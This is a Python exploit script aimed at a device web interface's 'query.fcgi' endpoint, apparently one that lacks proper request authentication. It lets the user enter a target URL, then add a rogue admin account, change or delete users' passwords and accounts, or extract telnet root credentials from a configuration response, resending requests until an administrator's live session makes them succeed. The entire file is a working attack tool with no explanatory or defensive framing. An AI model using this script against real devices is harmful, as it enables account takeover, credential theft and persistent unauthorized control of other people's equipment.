import requests

def send_request(url, payload):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url, data=payload, headers=headers)
    return response.text

def main():
    target_url = input("Enter the target URL (must end with /): ").strip()
    if not target_url.endswith("/"):
        print("Invalid URL! It must end with /")
        return
    target_url = target_url+"/query.fcgi"

    # # Check if admin is logged in
    # response = send_request(target_url, "form_state=1&form_name=system_users")
    # if "antel" not in response:
    #     print("Admin isn't logged in.")
    #     return

    # print("Admin is logged in.")
    action = input("Do you want to (1) Add new user or (2) Change user password or (3) delete user or (4) get the telnet user and password? (1/4): ").strip()

    if action == "1":
        # Adding a new user
        new_admin = input("Enter the new admin username: ").strip()
        while True:
            new_pass = input("Enter the new admin password (min 8 chars): ").strip()
            if len(new_pass) >= 8:
                break
            print("Password must be at least 8 characters long.")

        while True:
            payload = f"form_state=2&form_name=system_users&field_name=adduserb&field_val={new_admin}&field_val2={new_pass}&field_val3=1"
            response = send_request(target_url, payload)
            if "wait" not in response:
                print("Admin isn't logged in.")
            else:
                print("Admin is logged in.")
                print("User added successfully!")
                break

            # print(f"Admin is logged in. && User added successfully!{{ break }}" if "wait" in response else "Admin isn't logged in.")

    elif action == "2":
        # Changing user password
        response = send_request(target_url, "form_state=1&form_name=system_users")
        users_data = response.split("system_users;")[1].split(":end;")[0] if "system_users;" in response else None

        if not users_data:
            print("Failed to fetch user list.")
            return

        print("Available users:\n", users_data)
        username = input("Enter the username to change password for: ").strip()
        
        while True:
            new_pass = input("Enter the new password (min 8 chars): ").strip()
            if len(new_pass) >= 8:
                break
            print("Password must be at least 8 characters long.")

        while True:
            payload = f"form_state=2&form_name=system_users&field_name=pswduserb&field_val={username}&field_val2={new_pass}"
            response = send_request(target_url, payload)
            if "wait" not in response:
                print("Admin isn't logged in.")
            else:
                print("Admin is logged in.")
                print("Password changed successfully!")
                break
    elif action == "3":
        # delete user 
        response = send_request(target_url, "form_state=1&form_name=system_users")
        users_data = response.split("system_users;")[1].split(":end;")[0] if "system_users;" in response else None

        if not users_data:
            print("Failed to fetch user list.")
            return

        print("Available users:\n", users_data)
        username = input("Enter the username to delete it: ").strip()
        while True:
            payload = f"form_state=2&form_name=system_users&field_name=deluserb&field_val={username}"
            response = send_request(target_url, payload)
            if "wait" not in response:
                print("Admin isn't logged in.")
            else:
                print("Admin is logged in.")
                print("user deleted successfully!")
                break
    elif action =="4":
        # get the telnet user and password
        # form_state=1&form_name=tcp_opt
        while True:
            payload = f"form_state=1&form_name=tcp_opt"
            response = send_request(target_url, payload)
            if "db;" not in response:
                print("Admin isn't logged in.")
            else:
                print(response)
                parts = response.split(";")
                db_index = parts.index("db")
                root_index = db_index + 12    
                adminpass_index = root_index + 4
                root_value = parts[root_index]
                adminpass_value = parts[adminpass_index]
                print("Admin is logged in.")
                print(f"the telnet username is {root_value} and the password is {adminpass_value}")
                break

    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
